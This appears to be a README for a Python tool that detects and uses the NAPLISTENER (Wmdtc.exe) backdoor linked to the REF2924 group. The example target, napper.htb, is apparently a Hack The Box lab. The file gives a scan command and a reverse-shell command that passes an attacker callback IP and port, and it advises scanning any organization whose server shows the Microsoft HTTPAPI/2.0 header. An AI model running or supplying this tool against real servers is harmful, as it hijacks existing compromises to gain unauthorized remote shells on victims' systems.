# REF2924

NAPLISTENER is a backdoor scanner for the Wmdtc.exe backdoor associated with the REF2924 APT group.

We can use this tool on both Windows and Linux to scan target servers.

If you find the presence of the field [Microsoft HTTPAPI/2.0], within a website's "/" request header, you can try scanning the organization's backdoor.

When running the script for the first time, it will automatically help you download dependent files

# SCAN

`$ python3 wmdtc_backdoor.py -u "https://napper.htb"`

# Reverse Shell

`$ python3 wmdtc_backdoor.py -u "https://napper.htb" -ip_address 10.10.16.15 -port 10032`

![image.png](https://image.3001.net/images/20240505/1714842481_66366b7107e3b4577ca02.png!small)

[Reference Documentation](https://github.com/ttate10/CVE-2023-22527/files/15300630/Napper.pdf)
